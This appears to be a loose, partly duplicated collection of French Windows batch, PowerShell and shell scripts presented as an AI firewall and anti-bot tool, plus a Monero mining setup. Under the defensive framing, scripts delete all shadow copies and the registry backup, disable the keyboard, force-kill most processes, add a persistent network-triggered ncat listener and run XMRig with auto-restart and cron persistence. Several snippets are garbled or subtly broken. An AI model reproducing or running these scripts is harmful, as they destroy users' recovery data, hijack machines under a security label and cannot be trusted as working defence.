# Exécuter en tant qu'administrateur
Write-Output "Initialisation du pare-feu MWC..."

# 1. Reset des règles
netsh advfirewall reset

# 2. Blocage par défaut
netsh advfirewall set allprofiles firewallpolicy blockinboundalways,blockoutbound

# 3. Autoriser loopback pour l'IA, le wallet et la bibliothèque
netsh advfirewall firewall add rule name="Allow Loopback MWC" dir=in action=allow remoteip=127.0.0.1 protocol=TCP localport=any
netsh advfirewall firewall add rule name="Allow Loopback MWC Out" dir=out action=allow remoteip=127.0.0.1 protocol=TCP localport=any

# 4. Autoriser le port du wallet (ex: 5050)
netsh advfirewall firewall add rule name="Wallet Port" dir=in action=allow protocol=TCP localport=5050
netsh advfirewall firewall add rule name="Wallet Port Out" dir=out action=allow protocol=TCP localport=5050

# 5. Autoriser l'exécutable de ton IA moteur / wallet / bibliothèque
$executables = @(
  "C:\\CryptoSystem\\ia_wallet.exe",
  "C:\\CryptoSystem\\cheque_engine.exe",
  "C:\\CryptoSystem\\bibliotheque_wallet.exe"
)

foreach ($exe in $executables) {
    netsh advfirewall firewall add rule name="Allow $exe IN" dir=in action=allow program="$exe" enable=yes
    netsh advfirewall firewall add rule name="Allow $exe OUT" dir=out action=allow program="$exe" enable=yes
}

Write-Output "Pare-feu MWC actif et optimisé."

# 🔁 Boucle de surveillance IA
function Start-TrashScan {
  Write-Host "[IA] Initialisation de TrashScan BotGuard..."

  $thresholdLatency = 300  # en ms
  $allowedPorts = @(5050, 127.0.0.1)
  $suspiciousCount = @{}
  $trashList = @()

  while ($true) {
      Start-Sleep -Seconds 10

      # 🔎 Scan des connexions réseau suspectes
      $connections = Get-NetTCPConnection | Where-Object {
          $_.RemoteAddress -ne '127.0.0.1' -and $_.RemotePort -notin $allowedPorts
      }

      foreach ($conn in $connections) {
          $ip = $conn.RemoteAddress
          if (-not $suspiciousCount.ContainsKey($ip)) {
              $suspiciousCount[$ip] = 1
          } else {
              $suspiciousCount[$ip] += 1
          }

          # Si le nombre de connexions suspectes dépasse 5, on bloque
          if ($suspiciousCount[$ip] -gt 5) {
              Write-Host "[BLOCK] Adresse IP suspecte détectée: $ip"
              netsh advfirewall firewall add rule name="Blocked IP $ip" dir=in action=block remoteip=$ip
              $trashList += $ip
              $suspiciousCount[$ip] = 0
          }
      }

      # 🔍 Scan des processus latents suspects
      $procs = Get-Process | Where-Object { $_.CPU -gt 100 -and $_.Name -notmatch 'wallet|cheque|ia' }
      foreach ($proc in $procs) {
          Write-Host "[TRASH] Suppression du processus suspect: $($proc.Name)"
          Stop-Process -Id $proc.Id -Force
          $trashList += $proc.Name
      }

      # 📊 Statistiques temporaires
      Write-Host \"[INFO] Trash List actuelle: $($trashList | Sort-Object | Get-Unique)\"
  }
}

Start-TrashScan

@echo off
title MWC Firewall + TrashScan Anti-Bot
echo.
echo === [1] Réinitialisation du pare-feu...
netsh advfirewall reset

echo.
echo === [2] Blocage total par défaut...
netsh advfirewall set allprofiles firewallpolicy blockinboundalways,blockoutbound

echo.
echo === [3] Autorisation du loopback (127.0.0.1)...
netsh advfirewall firewall add rule name="MWC Loopback In" dir=in action=allow remoteip=127.0.0.1 protocol=TCP
netsh advfirewall firewall add rule name="MWC Loopback Out" dir=out action=allow remoteip=127.0.0.1 protocol=TCP

echo.
echo === [4] Autorisation du port du wallet (5050)...
netsh advfirewall firewall add rule name="Wallet Port In" dir=in action=allow protocol=TCP localport=5050
netsh advfirewall firewall add rule name="Wallet Port Out" dir=out action=allow protocol=TCP localport=5050

echo.
echo === [5] Autorisation des programmes IA / Wallet / Bibliothèque...
set EXE1=C:\CryptoSystem\ia_wallet.exe
set EXE2=C:\CryptoSystem\cheque_engine.exe
set EXE3=C:\CryptoSystem\bibliotheque_wallet.exe

netsh advfirewall firewall add rule name="IA Wallet IN" dir=in action=allow program="%EXE1%" enable=yes
netsh advfirewall firewall add rule name="IA Wallet OUT" dir=out action=allow program="%EXE1%" enable=yes
netsh advfirewall firewall add rule name="Cheque Engine IN" dir=in action=allow program="%EXE2%" enable=yes
netsh advfirewall firewall add rule name="Cheque Engine OUT" dir=out action=allow program="%EXE2%" enable=yes
netsh advfirewall firewall add rule name="Bibliothèque Wallet IN" dir=in action=allow program="%EXE3%" enable=yes
netsh advfirewall firewall add rule name="Bibliothèque Wallet OUT" dir=out action=allow program="%EXE3%" enable=yes

echo.
echo === [6] Activation du TrashScan Anti-Bot (IP + Processus)...
echo Démarrage de la surveillance des connexions...

REM Simuler détection IP suspectes (exemple à adapter)
for /f \"tokens=5\" %%a in ('netstat -n ^| findstr /V 127.0.0.1') do (
    echo Vérification de l'adresse %%a
    REM Exemple : bloquer toute IP qui revient plus de 3 fois
    findstr /c:\"%%a\" trash_log.txt >nul
    if errorlevel 1 (
        echo %%a>>trash_log.txt
    ) else (
        echo [BLOCK] Adresse suspecte %%a détectée !
        netsh advfirewall firewall add rule name=\"Trash IP %%a\" dir=in action=block remoteip=%%a
    )
)

REM Processus suspects à tuer (hors IA/Wallet)
tasklist | findstr /V \"ia_wallet.exe\" | findstr /V \"cheque_engine.exe\" | findstr /V \"System\" > temp_procs.txt
for /f \"tokens=1\" %%p in (temp_procs.txt) do (
    echo Suppression de %%p...
    taskkill /f /im %%p >nul 2>&1
)

echo.
echo === Pare-feu MWC avec TrashScan activé ===
pause

@echo off
title Corbeille IA TrashScan - Mode Destruction
setlocal EnableDelayedExpansion

echo [⚙] Initialisation IA TrashScan...

:: 1. Dossier de corbeille IA centralisée
set CORB=C:\TrashCorbeilleIA
if not exist "%CORB%" mkdir "%CORB%"

:: 2. Liste blanche (processus sains connus)
set WHITELIST=wallet.exe cheque_engine.exe explorer.exe

:: 3. Scan des tâches non exécutées (simulateur)
echo [🔍] Analyse des tâches non terminées...
tasklist > "%CORB%\\tasks_temp.txt"

for /f "tokens=1" %%a in ('type "%CORB%\\tasks_temp.txt"') do (
    set FOUND=0
    for %%w in (%WHITELIST%) do (
        if /I "%%a"=="%%w" set FOUND=1
    )
    if "!FOUND!"=="0" (
        echo %%a >> "%CORB%\\dead_commands.log"
        echo [🚫] Tâche inconnue : %%a (verrouillage)
    )
)

:: 4. Suppression des commandes mortes
echo [🗑️] Vérification des commandes mortes...
for /f "tokens=*" %%c in ('type "%CORB%\\dead_commands.log"') do (
    echo Tentative de suppression de %%c...
    taskkill /f /im %%c >nul 2>&1
    echo %%c >> "%CORB%\\corbeille_scan.lock"
)

:: 5. Désactivation clavier si code actif est détecté (simulation)
echo [🧠] Analyse hardware indirecte...
set DESTRUCT_KEY=dashkeyboard.lock
if exist "%CORB%\\%DESTRUCT_KEY%" (
    echo [💥] Signal destructif reçu. Destruction Dash Keyboard...
    reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout" /v Scancode Map /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1
)

echo [✔] Analyse terminée. Logs disponibles dans %CORB%
pause

@echo off
title TrashScan IA v2 - Corbeille Autonome Sécurisée
setlocal EnableDelayedExpansion

:: ========== PARAMÉTRAGE ==========
set CORB=C:\TrashCorbeilleIA
set DEAD_LOG=%CORB%\dead_commands.log
set LOCK_LOG=%CORB%\corbeille_scan.lock
set GOOD_REF=%CORB%\reference_bonne.log
set ZOMBIE_LOG=%CORB%\zombie_commands.log
set SIGNAL_LOG=%CORB%\opposition_signal.log
set WHITE=wallet.exe cheque_engine.exe explorer.exe

:: ========== INIT ==========

if not exist "%CORB%" mkdir "%CORB%"
del "%DEAD_LOG%" >nul 2>&1
del "%LOCK_LOG%" >nul 2>&1
del "%ZOMBIE_LOG%" >nul 2>&1

echo [⏳] Initialisation TrashScan...

:: ========== 1. Lister les processus actifs ==========
tasklist > "%CORB%\tasks_now.txt"

:: ========== 2. Identifier les processus non autorisés ==========
echo [🔍] Analyse des processus non enregistrés...
for /f "tokens=1" %%p in ('type "%CORB%\tasks_now.txt"') do (
    set FOUND=0
    for %%w in (%WHITE%) do (
        if /I "%%p"=="%%w" set FOUND=1
    )
    if "!FOUND!"=="0" (
        echo %%p >> "%DEAD_LOG%"
        echo [🧨] %%p marqué comme commande morte.
    )
)

:: ========== 3. Historique : opposition logique ==========
echo [📚] Analyse d'opposition logique...
for /f "tokens=*" %%x in ('type "%DEAD_LOG%"') do (
    findstr /i "%%x" "%GOOD_REF%" >nul
    if errorlevel 1 (
        echo [OPPOSE] %%x >> "%SIGNAL_LOG%"
    ) else (
        echo [⚠ Douteux] %%x présent mais déviant.
    )
)

:: ========== 4. Suppression + verrouillage ==========
echo [🗑️] Suppression des commandes mortes...
for /f "tokens=*" %%c in ('type "%SIGNAL_LOG%"') do (
    for /f "tokens=2" %%z in ("%%c") do (
        echo Destruction de %%z...
        taskkill /f /im %%z >nul 2>&1
        echo %%z >> "%LOCK_LOG%"
    )
)

:: ========== 5. Pare-feu si processus connu toxique ==========
echo [🛡️] Pare-feu activé sur les signaux reconnus...
for /f "tokens=*" %%m in ('type "%LOCK_LOG%"') do (
    netsh advfirewall firewall add rule name="Blocked %%m" dir=in action=block program="%%m" >nul
)

:: ========== 6. Détection des commandes zombies ==========
echo [🧟] Vérification commandes zombies...
for /f "tokens=*" %%z in ('type "%GOOD_REF%"') do (
    findstr /i "%%z" "%CORB%\tasks_now.txt" >nul
    if errorlevel 1 (
        echo %%z >> "%ZOMBIE_LOG%"
        echo [ZOMBIE] %%z non exécuté mais référencé.
    )
)

:: ========== 7. Préparation IA décentralisée ==========
echo [🔄] Simulation IA décentralisée activée...
set IA_LOG=%CORB%\ia_dynamique_report.txt
echo Timestamp: %date% %time% > "%IA_LOG%"
type "%DEAD_LOG%" >> "%IA_LOG%"
type "%ZOMBIE_LOG%" >> "%IA_LOG%"

echo [✔] TrashScan v2 terminé. Logs disponibles dans : %CORB%
pause

C:\TrashCorbeilleIA\
│
├── dead_commands.log         <- commandes jugées mortes
├── corbeille_scan.lock       <- verrouillage des commandes tuées
├── zombie_commands.log       <- commandes référencées mais non exécutées
├── reference_bonne.log       <- liste des tâches de référence
├── opposition_signal.log     <- opposition comportementale IA
├── ia_dynamique_report.txt   <- rapport global exportable vers backend
C:\Windows\ProxyScan\
├── incoming\        ← Dossier surveillé pour les téléchargements
├── quarantine\      ← Fichiers suspects
├── verified\        ← Fichiers validés
├── fake\            ← Copies falsifiées

@echo off
title 🔎 Corbeille IA - IP Tracker + VPN Scanner
setlocal EnableDelayedExpansion

:: === CONFIGURATION ===
set CORB=C:\TrashCorbeilleIA
set TRACK_LOG=%CORB%\ip_tracker.log
set FAKE_LAN_LOG=%CORB%\fake_lan_detected.log
set VPN_SUSPECT_LOG=%CORB%\vpn_suspect_ip.log
set REDIR_IP=127.0.0.1

if not exist "%CORB%" mkdir "%CORB%"
del "%TRACK_LOG%" >nul 2>&1
del "%FAKE_LAN_LOG%" >nul 2>&1
del "%VPN_SUSPECT_LOG%" >nul 2>&1

echo [📡] Lancement de l’analyse réseau active...

:: === SCAN NETSTAT : récupérer toutes les IP connectées sauf 127.0.0.1 ===
for /f "tokens=2 delims=[: ]" %%a in ('netstat -n ^| findstr /R "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" ^| findstr /V "127.0.0.1"') do (
    echo [👁️] IP détectée : %%a >> "%TRACK_LOG%"
    
    :: === Détection faux réseaux locaux ===
    echo %%a | findstr /R "^10\." >nul && (
        echo [⚠️] Faux LAN : %%a >> "%FAKE_LAN_LOG%"
    )
    echo %%a | findstr /R "^192\.168\." >nul && (
        echo [⚠️] Faux LAN : %%a >> "%FAKE_LAN_LOG%"
    )

    :: === Heuristique VPN : IP trop diverses / non conformes ===
    echo %%a | findstr /V /R "^192\.168\.|^10\.|^172\." >nul && (
        echo [🕵️] IP suspecte VPN : %%a >> "%VPN_SUSPECT_LOG%"
        netsh advfirewall firewall add rule name="BLOCK SUSPECT VPN %%a" dir=out action=block remoteip=%%a >nul
    )
)

:: === Réponse défensive : Redirection possible des flux (simulation) ===
echo [🔁] Détournement des IP suspectes vers %REDIR_IP% (simulation log)...
for /f "tokens=*" %%x in ('type "%VPN_SUSPECT_LOG%"') do (
    echo REDIRECT %%x vers %REDIR_IP% >> "%CORB%\ip_redirect_sim.log"
)

:: === Rapport final ===
echo.
echo === Résumé du scan réseau TrashScan ===
echo IPs enregistrées : %TRACK_LOG%
echo Faux LAN : %FAKE_LAN_LOG%
echo IPs suspectes VPN : %VPN_SUSPECT_LOG%
echo.
pause

@echo off
title 🔐 Malware Trap - TrashScan + Deep Defense

setlocal EnableDelayedExpansion
set CORB=C:\TrashCorbeilleIA
set TRACK_IP=%CORB%\ip_tracker.log
set PORT_LOG=%CORB%\port_trace.log
set REDIR_IP=127.0.0.1

echo [⚡] Lancement du scan de connexion...

:: Récupération des connexions actives
for /f "tokens=2,3 delims=[: ]" %%a in ('netstat -n ^| findstr /R "TCP.*[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*"') do (
    set IP=%%a
    set PORT=%%b
    echo !IP!:!PORT! >> "%PORT_LOG%"
    echo [🚨] IP suspecte enregistrée : !IP! port !PORT!
    
    :: Blocage pare-feu immédiat
    netsh advfirewall firewall add rule name="BLOCKED_!IP!" dir=out action=block remoteip=!IP! >nul
    
    :: Éventuel détournement simulation
    echo REDIR !IP! vers %REDIR_IP% >nul
)

:: Désactivation du clavier si intrusion critique détectée
echo [🔒] Vérification port critique (ex: 4444, 1337, 5555)...
findstr "4444 1337 5555" "%PORT_LOG%" >nul
if %errorlevel%==0 (
    echo [🛑] Port critique détecté. Verrouillage du clavier...
    rundll32.exe keyboard,disable  >nul 2>&1
)

:: Suppression des points de sauvegarde système
echo [💣] Suppression des sauvegardes système...
vssadmin delete shadows /all /quiet >nul 2>&1
wmic shadowcopy delete >nul 2>&1

:: Nettoyage RegBack (ancienne sauvegarde du registre)
echo [💥] Destruction RegBack...
del /f /s /q %SystemRoot%\System32\config\RegBack\* >nul 2>&1

:: Lancement analyse IA (module Python requis)
echo [🤖] Appel module IA Python de scan comportemental...
python trashscan_ai_deep.py

echo [✅] Défense activée. Rapport disponible dans %CORB%
pause

@echo off
title 🧠 IA Listener - Commande distribuée TrashScan
setlocal EnableDelayedExpansion

:: Nécessite ncat (netcat) de nmap.org ou portable (placez ncat.exe à côté de ce script)
set NCAT=ncat.exe
set PORT=50505
set TRIGGER=INIT_FIREWALL_LEARNING
set ACTION_SCRIPT=firewall_learning_ai.bat

echo [👂] En écoute sur le port %PORT% pour la commande IA...

:listen
%NCAT% -lu %PORT% | findstr /C:"%TRIGGER%"
if !errorlevel! EQU 0 (
    echo [✅] Commande IA reçue : %TRIGGER%
    call %ACTION_SCRIPT%
    goto listen
) else (
    timeout /t 2 >nul
    goto listen
)

@echo off
title 🔒 Déclenchement IA Pare-feu - TrashScan

echo [🔥] Initialisation du scan IA local...

:: Exemple d’action sécuritaire
netsh advfirewall firewall add rule name="IA_BlockedPort1337" dir=in action=block protocol=TCP localport=1337
netsh advfirewall firewall add rule name="IA_BlockedVPN" dir=out action=block remoteip=10.0.0.0/8

:: Lancement de scan Python (si disponible)
python trashscan_ai_deep.py

echo [🛡️] Défense IA activée localement.
pause

@echo off
title [🚀] Déploiement automatique des scripts IA TrashScan

:: Définition des variables
set INSTALL_DIR=%APPDATA%\TrashCorbeilleIA
set NCAT_URL=https://nmap.org/dist/ncat-portable-7.91.zip
set NCAT_ZIP=%INSTALL_DIR%\ncat.zip
set NCAT_EXE=%INSTALL_DIR%\ncat.exe
set SCRIPT_DIR=%INSTALL_DIR%\scripts

:: Création du dossier de déploiement
echo [📂] Création des dossiers...
mkdir "%INSTALL_DIR%"
mkdir "%SCRIPT_DIR%"

:: Téléchargement de ncat (via PowerShell pour un téléchargement automatique)
echo [🔽] Téléchargement de ncat...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%NCAT_URL%', '%NCAT_ZIP%')"

:: Décompression de ncat.zip
echo [📦] Décompression de ncat.zip...
powershell -Command "Expand-Archive -Path '%NCAT_ZIP%' -DestinationPath '%INSTALL_DIR%'"

:: Copie des scripts .bat et Python dans le répertoire des scripts
echo [📝] Déploiement des scripts...
copy "firewall_learning_ai.bat" "%SCRIPT_DIR%\firewall_learning_ai.bat" >nul
copy "trashscan_ai_deep.py" "%SCRIPT_DIR%\trashscan_ai_deep.py" >nul
copy "listen_network_command.bat" "%SCRIPT_DIR%\listen_network_command.bat" >nul

:: Ajout de l'exécution au démarrage du système
echo [⚙️] Ajout du script de démarrage dans le registre...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TrashScan_IA" /t REG_SZ /d "\"%SCRIPT_DIR%\listen_network_command.bat\"" /f

:: Vérification de la réussite
echo [✅] Déploiement terminé avec succès !
pause

@echo off
title [🚀] Déploiement avec Analyse CAPTCHA et Traçage IP

:: Lancer le script Python pour générer le CAPTCHA et l'enregistrement de l'IP
echo [🔍] Lancement de la génération du CAPTCHA...
python generate_captcha.py

:: Récupérer l'adresse IP locale de l'utilisateur
for /f "tokens=2 delims=[]" %%i in ('ping -n 1 localhost ^| findstr "["') do set IP_LOCAL=%%i

:: Créer le PDF contenant les logs
echo [📝] Création du PDF log dans la corbeille...
python create_pdf_log.py %IP_LOCAL%

:: Lancer l'analyse de l'IP et des transactions réseau
powershell -Command "& 'C:/TrashCorbeilleIA/scripts/track_ip_analysis.ps1'"

:: Fin du processus
echo [✅] Analyse terminée et log sauvegardé !
pause

$captcha_log_path = "C:/TrashCorbeilleIA/captcha_log.pdf"
$local_ip = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
$log_file = "C:/TrashCorbeilleIA/ip_tracker.log"

echo "Analyse de l'IP locale $local_ip et vérification du CAPTCHA..." >> $log_file

# Analyser la soumission du CAPTCHA
$captcha_solved = Get-Content "C:/TrashCorbeilleIA/captcha_solved.txt"

if ($captcha_solved -eq $false) {
    echo "Suspicion de bot détectée ! IP : $local_ip" >> $log_file
    # Activer l'IA pour analyser le comportement
    python analyze_behavior.py $local_ip
} else {
    echo "CAPTCHA résolu correctement." >> $log_file
}

@echo off
title [🚀] Déploiement avec Analyse CAPTCHA et Traçage IP

:: Lancer le script Python pour générer le CAPTCHA et l'enregistrement de l'IP
echo [🔍] Lancement de la génération du CAPTCHA...
python generate_captcha.py

:: Récupérer l'adresse IP locale de l'utilisateur
for /f "tokens=2 delims=[]" %%i in ('ping -n 1 localhost ^| findstr "["') do set IP_LOCAL=%%i

:: Créer le PDF contenant les logs
echo [📝] Création du PDF log dans la corbeille...
python create_pdf_log.py %IP_LOCAL%

:: Lancer l'analyse de l'IP et des transactions réseau
powershell -Command "& 'C:/TrashCorbeilleIA/scripts/track_ip_analysis.ps1'"

:: Fin du processus
echo [✅] Analyse terminée et log sauvegardé !
pause

# track_ip_analysis.ps1
$captcha_log_path = "C:/TrashCorbeilleIA/captcha_log.pdf"
$local_ip = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
$log_file = "C:/TrashCorbeilleIA/ip_tracker.log"

echo "Analyse de l'IP locale $local_ip et vérification du CAPTCHA..." >> $log_file

# Analyser la soumission du CAPTCHA
$captcha_solved = Get-Content "C:/TrashCorbeilleIA/captcha_solved.txt"

if ($captcha_solved -eq $false) {
    echo "Suspicion de bot détectée ! IP : $local_ip" >> $log_file
    # Activer l'IA pour analyser le comportement
    python analyze_behavior.py $local_ip
} else {
    echo "CAPTCHA résolu correctement." >> $log_file
}

# track_ip_analysis.ps1
$captcha_log_path = "C:/TrashCorbeilleIA/captcha_log.pdf"
$local_ip = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
$log_file = "C:/TrashCorbeilleIA/ip_tracker.log"

echo "Analyse de l'IP locale $local_ip et vérification du CAPTCHA..." >> $log_file

$captcha_solved = Get-Content "C:/TrashCorbeilleIA/captcha_solved.txt"

if ($captcha_solved -eq $false) {
    echo "Suspicion de bot détectée ! IP : $local_ip" >> $log_file
    python analyze_behavior.py $local_ip
} else {
    echo "CAPTCHA résolu correctement." >> $log_file
}

@echo off
title [🚀] Déploiement avec Analyse CAPTCHA et Traçage IP

:: Étape 1 : Lancer la génération du CAPTCHA avec Python
echo [🔍] Lancement de la génération du CAPTCHA...
python generate_captcha.py

:: Étape 2 : Obtenir l'IP locale
for /f "tokens=2 delims=[]" %%i in ('ping -n 1 localhost ^| findstr "["') do set IP_LOCAL=%%i

:: Étape 3 : Créer le PDF avec les logs de l'IP et CAPTCHA
echo [📝] Création du PDF log dans la corbeille...
python create_pdf_log.py %IP_LOCAL%

:: Étape 4 : Lancer l'analyse de l'IP via PowerShell
echo [🔐] Analyse de l'IP et du CAPTCHA en cours...
powershell -Command "& 'C:/TrashCorbeilleIA/scripts/track_ip_analysis.ps1'"

:: Étape 5 : Résumé et fin
echo [✅] Analyse terminée et log sauvegardé !
pause

pip install pillow fpdf

cd C:/TrashCorbeilleIA

deploy_ia.bat

# Ajout à la suite du fichier existant

SECURE_KEY = "admin_mobile_token"  # à remplacer dynamiquement dans un cas réel

# Fichiers protégés par le système IA
PROTECTED_DIR = CORB_PATH / "vault"
FAKE_COPY_DIR = CORB_PATH / "vault_fake"

def init_secure_vault():
    PROTECTED_DIR.mkdir(exist_ok=True)
    FAKE_COPY_DIR.mkdir(exist_ok=True)
    print("[🔐] Vault sécurisé initialisé.")

def protect_file(filename: str, content: str):
    original_path = PROTECTED_DIR / filename
    fake_path = FAKE_COPY_DIR / filename

    # Écrire la version réelle
    with open(original_path, 'w') as real_file:
        real_file.write(content)
    
    # Écrire une version corrompue
    with open(fake_path, 'w') as fake_file:
        fake_file.write("[❌] Fichier illisible ou partiellement supprimé.\nScan incomplet.\n")

def read_secure_file(filename: str, key: str):
    if key != SECURE_KEY:
        print(f"[🚫] Tentative d'accès illégale au fichier {filename}. Dérouté vers copie corrompue.")
        fake_path = FAKE_COPY_DIR / filename
        return fake_path.read_text() if fake_path.exists() else "[ERREUR] Fichier non trouvé."
    
    print(f"[✅] Accès autorisé à {filename}")
    real_path = PROTECTED_DIR / filename
    return real_path.read_text() if real_path.exists() else "[ERREUR] Fichier manquant."

def register_failed_access(filename: str, ip: str):
    with open(DEAD_LOG, 'a') as log:
        log.write(f"[{datetime.now().isoformat()}] Accès refusé à {filename} depuis {ip}\n")

# Exemple : Simuler une requête réseau
def simulate_file_request(filename, requester_ip, key_attempt="invalid"):
    content = read_secure_file(filename, key_attempt)
    if key_attempt != SECURE_KEY:
        register_failed_access(filename, requester_ip)
    return content

@echo off
:: Script de lancement TrashScan IA Node en admin
:: Vérifie si en mode admin
openfiles >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [❗] Ce script nécessite les droits administrateur.
    pause
    exit /b
)

:: Active le pare-feu pour bloquer les accès corbeille non-autorisés
netsh advfirewall firewall add rule name="TrashScanBlockCMD" dir=out action=block program="%SystemRoot%\System32\cmd.exe" enable=yes

:: Lance le script Python IA
echo [⚙️] Lancement du noeud IA TrashScan...
python "trashscan_ia_node.py"

pause

@echo off
:: === Root Server Commande Déploiement ===
:: Exécute des commandes sur le réseau en tant que root

:: Vérification admin
openfiles >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [⛔] Lancement root échoué : droits administrateur requis.
    pause
    exit /b
)

:: Lancement du serveur racine
echo [🔁] Initialisation du Root IA Server...
set "BROADCAST_COMMAND=INIT_FIREWALL_LEARNING"
set "BROADCAST_PORT=50505"

:: Création du script PowerShell pour envoi UDP
echo $udpclient = New-Object System.Net.Sockets.UdpClient >> send_broadcast.ps1
echo $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Broadcast, %BROADCAST_PORT%) >> send_broadcast.ps1
echo $bytes = [System.Text.Encoding]::ASCII.GetBytes("%BROADCAST_COMMAND%") >> send_broadcast.ps1
echo $udpclient.Send($bytes, $bytes.Length, $endpoint) >> send_broadcast.ps1
echo $udpclient.Close() >> send_broadcast.ps1

:: Exécution
powershell -ExecutionPolicy Bypass -File send_broadcast.ps1
del send_broadcast.ps1

echo [✅] Commande Root diffusée : %BROADCAST_COMMAND% sur le port %BROADCAST_PORT%
pause

pip install pyinstaller
pyinstaller --onefile --noconsole trashscan_ia_node.py

trashscan_ia_node.exe

@echo off
:: Vérifie l’élévation
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [🔒] Ce script nécessite les privilèges administrateur.
    powershell Start-Process cmd -ArgumentList '/c', '"%~f0"' -Verb RunAs
    exit /b
)

:: Lance le script Python
python trashscan_ia_node.py

C:\Windows\ProxyScan\
├── incoming\        ← Dossier surveillé pour les téléchargements
├── quarantine\      ← Fichiers suspects
├── verified\        ← Fichiers validés
├── fake\            ← Copies falsifiées

@echo off
setlocal enabledelayedexpansion

:: Vérifier droits admin
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [❌] Lancez ce script avec les droits administrateur.
    exit /b
)

:: Dossiers
set INCOMING=C:\Windows\ProxyScan\incoming
set VERIFIED=C:\Windows\ProxyScan\verified
set QUARANTINE=C:\Windows\ProxyScan\quarantine
set FAKE=C:\Windows\ProxyScan\fake

:: Créer dossiers si absents
for %%D in (%INCOMING% %VERIFIED% %QUARANTINE% %FAKE%) do (
    if not exist %%D mkdir %%D
)

echo [🔍] Surveillance des fichiers dans %INCOMING%...

:LOOP
for %%F in (%INCOMING%\*) do (
    if exist "%%F" (
        echo [⚙️] Traitement de %%~nxF...

        :: Créer copie falsifiée
        powershell -command "Set-Content -Path '%FAKE%\%%~nxF' -Value '[Fichier Factice - Signature dégradée]'"

        :: Simulation d’analyse via "proxy"
        set IS_CLEAN=1
        powershell -command "if ((Get-Random) %% 3 -eq 0) { exit 1 } else { exit 0 }"
        if errorlevel 1 (
            set IS_CLEAN=0
        )

        if "!IS_CLEAN!"=="1" (
            echo [✅] %%~nxF validé. Déplacement vers dossier sécurisé.
            move "%%F" "%VERIFIED%\%%~nxF" >nul
        ) else (
            echo [⚠️] %%~nxF suspect. Envoi en quarantaine.
            move "%%F" "%QUARANTINE%\%%~nxF" >nul
        )
    )
)
timeout /t 5 >nul
goto :LOOP

# Définir l'adresse IP à verrouiller
$ip_cible = "192.168.1.100"  # Change l'adresse IP en fonction de ta configuration

# Obtenir l'adresse IP locale
$ip_locale = (Test-NetConnection -ComputerName "localhost").RemoteAddress

if ($ip_locale -eq $ip_cible) {
    Write-Host "Adresse IP locale correcte. Le système de minage peut démarrer."
} else {
    Write-Host "Adresse IP locale incorrecte. Le minage est verrouillé sur cette adresse."
    exit
}

# Démarrer le processus de minage en utilisant XMRig (assurez-vous que le chemin vers XMRig est correct)
$chemin_xmrig = "C:\path\to\xmrig.exe"
$adresse_pool = "pool.example.com:port"  # Change l'adresse du pool de minage

# Lancer XMRig avec l'adresse IP correcte
Start-Process -FilePath $chemin_xmrig -ArgumentList "--url $adresse_pool --user <votre_wallet> --pass x"

Write-Host "Minage démarré sur l'adresse IP locale $ip_locale."

# Configurer le pare-feu Windows pour bloquer toute connexion sauf celle sur l'IP locale cible
New-NetFirewallRule -DisplayName "Block External Network" -Direction Outbound -RemoteAddress "0.0.0.0/0" -Action Block
New-NetFirewallRule -DisplayName "Allow Local Network" -Direction Outbound -RemoteAddress "$ip_cible" -Action Allow

Write-Host "Accès réseau verrouillé. Seules les connexions vers l'adresse IP $ip_cible sont autorisées."

while ($true) {
    $process = Get-Process | Where-Object { $_.Name -eq "xmrig" }
    if ($process) {
        Write-Host "Minage actif sur l'adresse IP $ip_locale."
    } else {
        Write-Host "Le processus de minage a été arrêté. Redémarrage..."
        Start-Process -FilePath $chemin_xmrig -ArgumentList "--url $adresse_pool --user <votre_wallet> --pass x"
    }
    Start-Sleep -Seconds 60
}

sudo nano /etc/network/interfaces

auto eth0
iface eth0 inet static
address 192.168.1.100  # IP fixe
netmask 255.255.255.0
gateway 192.168.1.1

network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      dhcp4: no
      addresses:
        - 192.168.1.100/24
      gateway4: 192.168.1.1

sudo netplan apply   # Ou 'sudo service networking restart' selon ta configuration

sudo apt update
sudo apt install build-essential cmake git libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake ..
make
sudo make install

xmrig

# Pour générer un wallet Monero
./monero-wallet-cli --generate-new-wallet monero_wallet

#!/bin/bash
IP="192.168.1.100"
WALLET_ADDRESS="votre_wallet"
POOL="pool.example.com:port"

# Vérifie si l'adresse IP est correcte
if [ $(hostname -I) == $IP ]; then
    echo "Adresse IP correcte, démarrage du minage..."
    ./xmrig --url $POOL --user $WALLET_ADDRESS --pass x
else
    echo "Adresse IP incorrecte. Minage désactivé."
fi

crontab -e

@reboot /path/to/start_mining.sh

monero-wallet-cli.exe --generate-new-wallet monero_wallet

44AFF8Z8K8gQzH6F5Jxz5R8NQ2e8BHHXw7kT...  (ton adresse_pool.libhwloc.onefile.openfiles/dead_commands)

{
    "url": "pool.minexmr.com:4444",  # Remplace par l'adresse du pool de minage
    "user": "44AFF8Z8K8gQzH6F5Jxz5R8NQ2e8BHHXw7kT...  # L'adresse du wallet
    "pass": "x",
    "rig-id": "computer1",  # Nom du rig pour identifier l'ordinateur
    "tls": false
}

# Définir les chemins
$wallet_url = "https://exemple.com/monero_wallet.zip"
$miner_url = "https://example.com/xmrig.zip"
$destination_path = "C:\miner"

# Télécharger le wallet et le mineur
Invoke-WebRequest -Uri $wallet_url -OutFile "$destination_path\monero_wallet.zip"
Invoke-WebRequest -Uri $miner_url -OutFile "$destination_path\xmrig.zip"

# Extraire les fichiers téléchargés
